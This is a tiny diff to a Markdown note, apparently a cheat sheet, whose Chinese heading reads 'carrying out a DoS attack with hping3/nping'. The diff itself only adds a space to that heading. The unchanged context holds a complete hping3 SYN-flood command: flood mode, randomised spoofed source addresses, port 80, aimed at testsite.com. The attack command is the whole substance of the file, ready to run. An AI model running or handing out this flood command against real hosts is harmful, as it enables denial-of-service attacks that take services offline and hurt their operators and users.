@@ -1,4 +1,4 @@
-#使用hping3/nping施行DoS攻擊
+# 使用hping3/nping施行DoS攻擊
 ```
 # hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source testsite.com
 ```
